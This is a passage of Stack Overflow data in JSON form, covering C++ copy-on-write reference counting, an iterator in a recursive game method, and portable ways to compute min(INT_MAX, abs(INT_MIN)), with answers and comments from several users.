a website somewhrere?"}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 2921, "user_id": 9133378, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/goYCP.jpg?s=128&g=1", "display_name": "scottxiao", "link": "https://stackoverflow.com/users/9133378/scottxiao"}, "edited": false, "score": 0, "creation_date": 1519968053, "post_id": 29810013, "comment_id": 85131574, "body": "@bigxiao look at the source code for whatever STL comes with your compiler tool chain. The STL is hugely templated, so it is comprised mostly of header-only implementations. Look at the contents of the <code>&lt;memory&gt;</code> header."}], "tags": [], "owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "is_accepted": false, "score": 2, "last_activity_date": 1429741821, "last_edit_date": 1429741821, "creation_date": 1429741382, "answer_id": 29810013, "question_id": 29808449, "link": "https://stackoverflow.com/questions/29808449/c-copy-on-write-basic-implementation/29810013#29810013", "title": "C++ - copy-on-write basic implementation", "body": "<p>Your design is flawed.  You need to implement the reference count on the character data itself, not on the individual <code>CPerson</code> objects, as they are not sharing a single reference count variable with each other.</p>\n\n<p>Try something more like this instead:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n\nusing namespace std;\n\nstruct SPersonData\n{\n    string m_name;\n    string m_surname;\n    int m_refcnt;\n\n    SPersonData() : m_refcnt(0) {}\n\n    void incRef() { ++m_refcnt; }\n    void decRef() { if (--m_refcnt == 0) delete this; }\n};\n\nclass CPerson\n{\nprivate:\n    SPersonData *m_data;\n\npublic:\n    CPerson ();\n    CPerson (const CPerson&amp;);\n    ~CPerson (); \n\n    CPerson&amp; operator= (const CPerson&amp;);\n\n    string getName() const;\n    string getSurname() const;\n\n    void rename (const string&amp;, const string&amp;);\n};\n\nCPerson::CPerson ()\n    : m_data(NULL) {}\n\nCPerson::CPerson (const CPerson&amp; src)\n    : m_data (src.m_data)\n{\n    if (m_data) m_data-&gt;incRef();\n}\n\nCPerson::~CPerson ()\n{\n    if (m_data) m_data-&gt;decRef();\n}\n\nCPerson&amp; operator= (const CPerson &amp;src)\n{\n    if (this != &amp;src)\n    {\n        if (m_data) m_data-&gt;decRef();\n        m_data = src.m_data;\n        if (m_data) m_data-&gt;incRef();\n    }    \n    return *this;\n}\n\nstring CPerson::getName() const\n{\n    if (m_data) return m_data-&gt;m_name;\n    return string();\n}\n\nstring CPerson::getSurname() const\n{ \n    if (m_data) return m_data-&gt;m_surname;\n    return string();\n}\n\nvoid CPerson::rename (const string &amp;name, const string &amp;surname)\n{\n    if ((m_data) &amp;&amp; (m_data-&gt;m_refcnt &gt; 1))\n    {\n        m_data-&gt;decRef(); \n        m_data = NULL;\n    }\n\n    if (!m_data)\n    {\n        m_data = new SPersonData;\n        m_data-&gt;incRef();\n    }\n\n    m_data-&gt;m_name = name;\n    m_data-&gt;m_surname = surname;\n}\n</code></pre>\n\n<p>Which can be greatly simplified in C++11 and later by using <code>std::shared_ptr</code> to manage the reference count:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include &lt;memory&gt;\n\nusing namespace std;\n\nstruct SPersonData\n{\n    string m_name;\n    string m_surname;\n};\n\nclass CPerson\n{\npublic:\n    shared_ptr&lt;SPersonData&gt; m_data;\n\n    string getName() const;\n    string getSurname() const;\n\n    void rename (const string&amp;, const string&amp;);\n};\n\nstring CPerson::getName() const\n{\n    if (m_data) return m_data-&gt;m_name;\n    return string();\n}\n\nstring CPerson::getSurname() const\n{ \n    if (m_data) return m_data-&gt;m_surname;\n    return string();\n}\n\nvoid CPerson::rename (const string &amp;name, const string &amp;surname)\n{\n    if (!((m_data) &amp;&amp; m_data.unique()))\n        m_data = make_shared&lt;SPersonData&gt;(); \n\n    m_data-&gt;m_name = name;\n    m_data-&gt;m_surname = surname;\n}\n</code></pre>\n\n<p>Either way, your test would then look like this:</p>\n\n<pre><code>int main ()\n{\n    CPerson a;\n    a.rename (\"Jack\", \"Smith\");\n    cout &lt;&lt; a.getName() &lt;&lt; \" \" &lt;&lt; a.getSurname() &lt;&lt; endl;\n\n    CPerson b(a);\n    cout &lt;&lt; a.getName() &lt;&lt; \" \" &lt;&lt; a.getSurname() &lt;&lt; endl;\n    cout &lt;&lt; b.getName() &lt;&lt; \" \" &lt;&lt; b.getSurname() &lt;&lt; endl;\n    // good so far...\n\n    a.rename (\"John\", \"Anderson\"); // should rename only 'a' not 'b'\n    cout &lt;&lt; a.getName() &lt;&lt; \" \" &lt;&lt; a.getSurname() &lt;&lt; endl;\n    cout &lt;&lt; b.getName() &lt;&lt; \" \" &lt;&lt; b.getSurname() &lt;&lt; endl;   \n\n    return  0;\n}\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 3135198, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d1a5f74b2a9c063120840e1ae65a9b9?s=128&d=identicon&r=PG&f=1", "display_name": "user3135198", "link": "https://stackoverflow.com/users/3135198/user3135198"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 951, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1429741821, "creation_date": 1429735541, "question_id": 29808449, "link": "https://stackoverflow.com/questions/29808449/c-copy-on-write-basic-implementation", "title": "C++ - copy-on-write basic implementation", "body": "<p>We are supposed to use copy-on-write on our school project. I've been experimenting with a very simple class, but without any luck. I have this:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;cstdlib&gt;\n#include &lt;cstring&gt;\n\nusing namespace std;\n\nclass CPerson {\n   public:\n            CPerson ();\n            CPerson (const CPerson&amp;);\n           ~CPerson (); \n      char* m_name;\n      char* m_surname;\n      int   m_refs;\n\n      void  rename (const char*, const char*);\n};\n\nCPerson :: CPerson () : m_name(NULL), m_surname(NULL), m_refs(1) {}\n\nCPerson :: CPerson (const CPerson&amp; src) : m_name (src.m_name), m_surname (src.m_surname), m_refs(src.m_refs+1) {} // supposed to be a shallow copy\n\nCPerson :: ~CPerson () {\n   if (m_refs == 1) {\n      delete [] m_name;\n      delete [] m_surname;\n   }\n   else --m_refs;\n}\n\nvoid CPerson :: rename (const char* name, const char* surname) {\n   delete [] m_name;\n   delete [] m_surname;\n\n   m_name = new char [strlen(name)+1];\n   m_surname = new char [strlen(surname)+1];\n\n   strcpy (m_name, name);\n   strcpy (m_surname, surname);\n}\n\nint main () {\n   CPerson a;\n   a.rename (\"Jack\", \"Smith\");\n   cout &lt;&lt; a.m_name &lt;&lt; \" \" &lt;&lt; a.m_surname &lt;&lt; endl;\n\n   CPerson b(a);\n   cout &lt;&lt; a.m_name &lt;&lt; \" \" &lt;&lt; a.m_surname &lt;&lt; endl;\n   cout &lt;&lt; b.m_name &lt;&lt; \" \" &lt;&lt; b.m_surname &lt;&lt; endl;\n   // good so far...\n\n   a.rename (\"John\", \"Anderson\"); // should rename both 'a' and 'b'\n   cout &lt;&lt; a.m_name &lt;&lt; \" \" &lt;&lt; a.m_surname &lt;&lt; endl;\n   cout &lt;&lt; b.m_name &lt;&lt; \" \" &lt;&lt; b.m_surname &lt;&lt; endl;   \n\n   // prints random values\n\n\n\n   return  0;\n}\n</code></pre>\n\n<p>It is strange because when I take out the couts, everything works OK (no leaks, no errors by valgrind).</p>\n\n<p>Any help would be appreciated.</p>\n"}, {"tags": ["c++", "recursion", "iterator", "reset"], "comments": [{"owner": {"reputation": 30265, "user_id": 3246555, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ziIu9.png?s=128&g=1", "display_name": "AlexD", "link": "https://stackoverflow.com/users/3246555/alexd"}, "edited": false, "score": 0, "creation_date": 1429736209, "post_id": 29808425, "comment_id": 47745435, "body": "A side remark: use <code>!=</code>: <code>it != vect.end()</code>."}], "answers": [{"tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 1, "last_activity_date": 1429735790, "creation_date": 1429735790, "answer_id": 29808523, "question_id": 29808425, "link": "https://stackoverflow.com/questions/29808425/iterator-go-back-to-beginning-in-a-recursive-method/29808523#29808523", "title": "iterator go back to beginning in a recursive method", "body": "<blockquote>\n  <p>I don't understand why my iterator (it) is reset to the beginning after I recall the method, I can see it with the debbuger</p>\n</blockquote>\n\n<p>When you call the function recursively, the iterators in the next invocation of the  have no relationship with the iterators in the previous invocation of function. When you use <code>std::vector&lt;Cube&gt;::iterator it = vect.begin();</code>, it makes sense that that <code>it</code> points to the start of the <code>vector</code>.</p>\n"}], "owner": {"reputation": 511, "user_id": 1355225, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/79efeddf0c48fd4708e8176afa920b30?s=128&d=identicon&r=PG", "display_name": "caps lock", "link": "https://stackoverflow.com/users/1355225/caps-lock"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 421, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1429746625, "creation_date": 1429735461, "last_edit_date": 1429746625, "question_id": 29808425, "link": "https://stackoverflow.com/questions/29808425/iterator-go-back-to-beginning-in-a-recursive-method", "title": "iterator go back to beginning in a recursive method", "body": "<p>I'm having a lot of trouble with a method I wrote for a game. I'm moving \"cubes\" from right to left in a cartesian plane, and before moving a cube I need to check if it can moves. Cube can push another cube (and many other) until there's not a wall.\nI don't understand why my iterator (it) is reset to the beginning after I recall the method, I can see it with the debbuger</p>\n\n<pre><code>bool Cube::moveLeft(std::vector&lt;Cube&gt;&amp; vect, int column, int line){\n    //freeSpace == false  (if we have a cube at the left position)\n    bool freeSpace = Cube::whatIsClose(vect, column, line - 1);\n    //isWall == true (if we have a wall at the left position)\n    bool isWall = Cube::whatIsClose(vect, column, line - 1, WALL);\n\n    for (std::vector&lt;Cube&gt;::iterator it = vect.begin(); it &lt; vect.end(); ++it){\n        //if space is avaible\n        if (freeSpace){\n            //we iterate \n            if ((it-&gt;getX() == column) &amp;&amp;\n                (it-&gt;getY() == line)){\n                //we can move to the left\n                it-&gt;setY(line - 1);\n                return true;\n            }\n        }\n        //else if there s a cube at the left position\n        else if (!freeSpace){\n            //if its a wall we cant move\n            if (isWall){\n                return false;\n            }\n            else//the cube is not a wall\n            {       \n                //we check if this cube can move and this call will move it\n                if (Cube::moveLeft(vect, column, line - 1)){        \n                    //here is the problem :\n                    //my iterator it is reinitialize to 0..\n                    it-&gt;setY(line - 1);\n                    return true;\n                }\n            }\n        }\n    }\n    return false;\n}\n</code></pre>\n\n<p>EDIT : answer to myself</p>\n\n<pre><code>            if (freeSpace){\n                setY(line - 1);\n                return true;\n            }\n</code></pre>\n"}, {"tags": ["c++", "c", "math", "limits"], "comments": [{"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "reply_to_user": {"reputation": 27385, "user_id": 1382251, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/17622c39e8ead537a0944c767551b2fe?s=128&d=identicon&r=PG", "display_name": "barak manos", "link": "https://stackoverflow.com/users/1382251/barak-manos"}, "edited": false, "score": 3, "creation_date": 1429747180, "post_id": 29808397, "comment_id": 47750103, "body": "@barakmanos: They&#39;re not the same; usually, <code>INT_MIN == -INT_MAX - 1</code>. I think it&#39;s actually UB to take <code>-INT_MIN</code> on such systems."}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 1, "creation_date": 1429779694, "post_id": 29808397, "comment_id": 47763793, "body": "you mean the <code>abs</code> function 2&#39;s complement which returns the same type as the argument so <code>abs(INT_MIN) == INT_MIN</code> or abs in the mathematical sense, which might need a wider type to return the correct value of <code>min(INT_MAX, abs(INT_MIN))</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 91978, "user_id": 387076, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/cFyP6.jpg?s=128&g=1", "display_name": "Gilles &#39;SO- stop being evil&#39;", "link": "https://stackoverflow.com/users/387076/gilles-so-stop-being-evil"}, "edited": false, "score": 2, "creation_date": 1429735697, "post_id": 29808442, "comment_id": 47745069, "body": "This is not what the question asks. <code>abs(INT_MIN)</code> isn&#39;t portable \u2014 so how do you compute the absolute value of <code>INT_MIN</code>? If <code>INT_MAX</code> is -2^31, then abs(<code>INT_MAX</code>) <i>is</i> 2^31 \u2014 this is simple math. That number cannot be represented as an <code>int32_t</code>, so you need another way to compare it with <code>INT_MAX</code>."}], "tags": [], "owner": {"reputation": 47569, "user_id": 3255455, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5993e7ece129141878cd6419d39cc26e?s=128&d=identicon&r=PG&f=1", "display_name": "gnasher729", "link": "https://stackoverflow.com/users/3255455/gnasher729"}, "is_accepted": false, "score": 0, "last_activity_date": 1429735531, "creation_date": 1429735531, "answer_id": 29808442, "question_id": 29808397, "link": "https://stackoverflow.com/questions/29808397/how-to-portably-find-out-minint-max-absint-min/29808442#29808442", "title": "How to portably find out min(INT_MAX, abs(INT_MIN))?", "body": "<p>On most systems, abs (INT_MIN) is not defined. For example, on typical 32 bit machines, INT_MAX = 2^31 - 1, INT_MIN = - 2^31, and abs (INT_MIN) cannot be 2^31. </p>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 1, "creation_date": 1429735728, "post_id": 29808457, "comment_id": 47745094, "body": "This is no bad answer!"}, {"owner": {"reputation": 6316, "user_id": 3323096, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1227f90127f0f7b8678a8c13261f48b4?s=128&d=identicon&r=PG", "display_name": "Vality", "link": "https://stackoverflow.com/users/3323096/vality"}, "edited": false, "score": 0, "creation_date": 1429735806, "post_id": 29808457, "comment_id": 47745145, "body": "I didnt -1, I was just pointing out an error in an earlier revision. I will remove that now"}, {"owner": {"reputation": 9542, "user_id": 985296, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/fb867640ddc6aee363d96530573845b0?s=128&d=identicon&r=PG", "display_name": "stefan", "link": "https://stackoverflow.com/users/985296/stefan"}, "edited": false, "score": 1, "creation_date": 1429735862, "post_id": 29808457, "comment_id": 47745184, "body": "Well it&#39;s still incorrect. <code>abs(INT_MIN)</code> <i>may</i> be equal to INT_MAX, depending on the architecture. In that case it&#39;s clearly well-formed."}, {"owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "reply_to_user": {"reputation": 9542, "user_id": 985296, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/fb867640ddc6aee363d96530573845b0?s=128&d=identicon&r=PG", "display_name": "stefan", "link": "https://stackoverflow.com/users/985296/stefan"}, "edited": false, "score": 0, "creation_date": 1429735895, "post_id": 29808457, "comment_id": 47745207, "body": "@stefan; Standard says its UB and that&#39;s it."}, {"owner": {"reputation": 9542, "user_id": 985296, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/fb867640ddc6aee363d96530573845b0?s=128&d=identicon&r=PG", "display_name": "stefan", "link": "https://stackoverflow.com/users/985296/stefan"}, "edited": false, "score": 0, "creation_date": 1429735927, "post_id": 29808457, "comment_id": 47745229, "body": "@haccks No, it does not. it does not force 2s or 1s complement."}, {"owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "reply_to_user": {"reputation": 14316, "user_id": 1012936, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/eXQaP.png?s=128&g=1", "display_name": "milleniumbug", "link": "https://stackoverflow.com/users/1012936/milleniumbug"}, "edited": false, "score": 0, "creation_date": 1429736328, "post_id": 29808457, "comment_id": 47745515, "body": "@milleniumbug; Now it answers ."}, {"owner": {"reputation": 9542, "user_id": 985296, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/fb867640ddc6aee363d96530573845b0?s=128&d=identicon&r=PG", "display_name": "stefan", "link": "https://stackoverflow.com/users/985296/stefan"}, "edited": false, "score": 0, "creation_date": 1429740717, "post_id": 29808457, "comment_id": 47747734, "body": "@haccks I posted my own answer as I was tired of explaining the same thing over and over again. Please tell me if there are things left unclear."}, {"owner": {"reputation": 23625, "user_id": 2868801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ec5567811049b7ce8192be0bc0246d1?s=128&d=identicon&r=PG&f=1", "display_name": "dave_thompson_085", "link": "https://stackoverflow.com/users/2868801/dave-thompson-085"}, "edited": false, "score": 0, "creation_date": 1429746871, "post_id": 29808457, "comment_id": 47750000, "body": "If UINT_MAX == INT_MAX (where INT_MAX == math_not_C_pow(2,num_magnitude_bits)-1) as is allowed but rare, and INT_MIN == -INT_MAX -1 as is allowed and common (for 2sC), b=(unsigned)(INT_MIN) yields 0 and is selected as the minimum, which is not the correct result."}], "tags": [], "owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "is_accepted": false, "score": -1, "last_activity_date": 1429765576, "last_edit_date": 1592644375, "creation_date": 1429735585, "answer_id": 29808457, "question_id": 29808397, "link": "https://stackoverflow.com/questions/29808397/how-to-portably-find-out-minint-max-absint-min/29808457#29808457", "title": "How to portably find out min(INT_MAX, abs(INT_MIN))?", "body": "<p><code>abs(INT_MIN)</code> will invoke undefined behavior. Standard says</p>\n<h3>7.22.6.1 The <code>abs</code>, <code>labs</code> and <code>llabs</code> functions:</h3>\n<blockquote>\n<p>The <code>abs</code>, <code>labs</code>, and <code>llabs</code> functions compute the absolute value of an integer <code>j</code>. If the result cannot be represented, the behavior is undefined.</p>\n</blockquote>\n<p>Try this instead  :<br />\nConvert <code>INT_MIN</code> to <code>unsignrd int</code>. Since -ve numbers can't be represented as an <code>unsigned int</code>, <code>INT_MAX</code> will be converted to <code>UINT_MAX + 1 + INT_MIN</code>.</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nunsigned min(unsigned a, unsigned b)\n{\n    return a &lt; b ? a : b;\n}\n\nint main(void)\n{\n    printf(&quot;%u\\n&quot;, min(INT_MAX, INT_MIN));\n}  \n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 7587, "user_id": 943010, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/R7Q27.png?s=128&g=1", "display_name": "kdopen", "link": "https://stackoverflow.com/users/943010/kdopen"}, "edited": false, "score": 2, "creation_date": 1429735742, "post_id": 29808461, "comment_id": 47745104, "body": "Actually, it&#39;s still not correct because <code>-INT_MIN</code> can&#39;t be represented in an <code>int</code>"}, {"owner": {"reputation": 14316, "user_id": 1012936, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/eXQaP.png?s=128&g=1", "display_name": "milleniumbug", "link": "https://stackoverflow.com/users/1012936/milleniumbug"}, "reply_to_user": {"reputation": 7587, "user_id": 943010, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/R7Q27.png?s=128&g=1", "display_name": "kdopen", "link": "https://stackoverflow.com/users/943010/kdopen"}, "edited": false, "score": 7, "creation_date": 1429736774, "post_id": 29808461, "comment_id": 47745750, "body": "@kdopen The branch with <code>-INT_MIN</code> is not evaluated then, which means UB doesn&#39;t happen."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1429740202, "post_id": 29808461, "comment_id": 47747504, "body": "<code>INT_MAX + INT_MIN</code> will evaluate to either 0 (sign and magnitude, one\u2019s complement) or -1 (two\u2019s complement).  In either case, the result have the value of  <code>INT_MAX</code>."}, {"owner": {"reputation": 91345, "user_id": 481267, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/DMvoo.png?s=128&g=1", "display_name": "Brian Bi", "link": "https://stackoverflow.com/users/481267/brian-bi"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1429740259, "post_id": 29808461, "comment_id": 47747531, "body": "@chux See the answer by JeremyRoman: pre-C99, other representations were allowed."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1429741117, "post_id": 29808461, "comment_id": 47747903, "body": "Let me know of a C89 compliant platform where <code>INT_MAX + INT_MIN</code> does not have the values 0 nor -1 so I may award a bonus of +50 for this answer."}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1429744595, "post_id": 29808461, "comment_id": 47749214, "body": "Even simpler would just be to compare <code>INT_MIN &lt; -INIT_MAX</code>"}, {"owner": {"reputation": 91345, "user_id": 481267, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/DMvoo.png?s=128&g=1", "display_name": "Brian Bi", "link": "https://stackoverflow.com/users/481267/brian-bi"}, "reply_to_user": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 3, "creation_date": 1429745173, "post_id": 29808461, "comment_id": 47749427, "body": "@JensGustedt That makes an analogous assumption, that <code>-INT_MAX</code> is representable as an <code>int</code>."}, {"owner": {"reputation": 91978, "user_id": 387076, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/cFyP6.jpg?s=128&g=1", "display_name": "Gilles &#39;SO- stop being evil&#39;", "link": "https://stackoverflow.com/users/387076/gilles-so-stop-being-evil"}, "edited": false, "score": 0, "creation_date": 1429747150, "post_id": 29808461, "comment_id": 47750095, "body": "@Brian On what implementation (real or hypothetical) is <code>-INT_MAX</code> not representable?"}, {"owner": {"reputation": 7587, "user_id": 943010, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/R7Q27.png?s=128&g=1", "display_name": "kdopen", "link": "https://stackoverflow.com/users/943010/kdopen"}, "reply_to_user": {"reputation": 14316, "user_id": 1012936, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/eXQaP.png?s=128&g=1", "display_name": "milleniumbug", "link": "https://stackoverflow.com/users/1012936/milleniumbug"}, "edited": false, "score": 0, "creation_date": 1429822411, "post_id": 29808461, "comment_id": 47794847, "body": "@milleniumbug Actually I reassert my original objection. Although the the branch with {{-INT_MIN}} in it won&#39;t be <i>executed</i>, it must still be <i>compiled</i>. Unless the compiler uses a larger data type (assumes {{sizeof(int) &lt; sizeof(long)}}) to store the constant and then coerces it at run time, this should raise a compilation error on older C compilers."}, {"owner": {"reputation": 91345, "user_id": 481267, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/DMvoo.png?s=128&g=1", "display_name": "Brian Bi", "link": "https://stackoverflow.com/users/481267/brian-bi"}, "reply_to_user": {"reputation": 7587, "user_id": 943010, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/R7Q27.png?s=128&g=1", "display_name": "kdopen", "link": "https://stackoverflow.com/users/943010/kdopen"}, "edited": false, "score": 0, "creation_date": 1429823286, "post_id": 29808461, "comment_id": 47795326, "body": "@kdopen I see no reason why this should not compile. The compiler is not required to evaluate constant expressions at compile time. It may do so, but not if this would cause it to reject a conforming program. This expression follows all the rules. In C, a minus sign is not considered part of an integer constant."}], "tags": [], "owner": {"reputation": 91345, "user_id": 481267, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/DMvoo.png?s=128&g=1", "display_name": "Brian Bi", "link": "https://stackoverflow.com/users/481267/brian-bi"}, "is_accepted": false, "score": 10, "last_activity_date": 1429735979, "last_edit_date": 1429735979, "creation_date": 1429735596, "answer_id": 29808461, "question_id": 29808397, "link": "https://stackoverflow.com/questions/29808397/how-to-portably-find-out-minint-max-absint-min/29808461#29808461", "title": "How to portably find out min(INT_MAX, abs(INT_MIN))?", "body": "<pre><code>INT_MAX + INT_MIN &lt; 0 ? INT_MAX : -INT_MIN\n</code></pre>\n\n<p><em>Edited to add explanation:</em> Of course the difficulty is that <code>-INT_MIN</code> or <code>abs(INT_MIN)</code> will be undefined if <code>-INT_MIN</code> is too big to fit in an <code>int</code>. So we need some way of checking whether this is the case. The condition <code>INT_MAX + INT_MIN &lt; 0</code> tests whether <code>-INT_MIN</code> is greater than <code>INT_MAX</code>. If it is, then <code>INT_MAX</code> is the smaller of the two absolute values. If not, then <code>INT_MAX</code> is the larger of the two absolute values, and <code>-INT_MIN</code> is the correct answer.</p>\n"}, {"tags": [], "owner": {"reputation": 91978, "user_id": 387076, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/cFyP6.jpg?s=128&g=1", "display_name": "Gilles &#39;SO- stop being evil&#39;", "link": "https://stackoverflow.com/users/387076/gilles-so-stop-being-evil"}, "is_accepted": false, "score": 1, "last_activity_date": 1429735927, "creation_date": 1429735927, "answer_id": 29808571, "question_id": 29808397, "link": "https://stackoverflow.com/questions/29808397/how-to-portably-find-out-minint-max-absint-min/29808571#29808571", "title": "How to portably find out min(INT_MAX, abs(INT_MIN))?", "body": "<p><code>-INT_MAX</code> is representable as an <code>int</code> in all C and C++ dialects, as far as I know. Therefore:</p>\n\n<pre><code>-INT_MAX &lt;= INT_MIN ? -INT_MIN : INT_MAX\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 91978, "user_id": 387076, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/cFyP6.jpg?s=128&g=1", "display_name": "Gilles &#39;SO- stop being evil&#39;", "link": "https://stackoverflow.com/users/387076/gilles-so-stop-being-evil"}, "edited": false, "score": 0, "creation_date": 1429736139, "post_id": 29808593, "comment_id": 47745392, "body": "Is that true in C89? That old but not dead language doesn&#39;t mandate one of those three representations."}, {"owner": {"reputation": 15544, "user_id": 864393, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59ae69e09086fed821a36d36814022c2?s=128&d=identicon&r=PG", "display_name": "Jeremy Roman", "link": "https://stackoverflow.com/users/864393/jeremy-roman"}, "reply_to_user": {"reputation": 91978, "user_id": 387076, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/cFyP6.jpg?s=128&g=1", "display_name": "Gilles &#39;SO- stop being evil&#39;", "link": "https://stackoverflow.com/users/387076/gilles-so-stop-being-evil"}, "edited": false, "score": 0, "creation_date": 1429736284, "post_id": 29808593, "comment_id": 47745484, "body": "Ah, thanks. I don&#39;t have a C89 spec at hand, but as you edited, this is true in C99."}, {"owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "edited": false, "score": 0, "creation_date": 1429736534, "post_id": 29808593, "comment_id": 47745626, "body": "How does this answer the question?"}, {"owner": {"reputation": 15544, "user_id": 864393, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59ae69e09086fed821a36d36814022c2?s=128&d=identicon&r=PG", "display_name": "Jeremy Roman", "link": "https://stackoverflow.com/users/864393/jeremy-roman"}, "edited": false, "score": 4, "creation_date": 1429737166, "post_id": 29808593, "comment_id": 47745963, "body": "haccks: On C99 and above, the representation restriction prevents abs(INT_MIN) from being smaller than INT_MAX."}, {"owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", 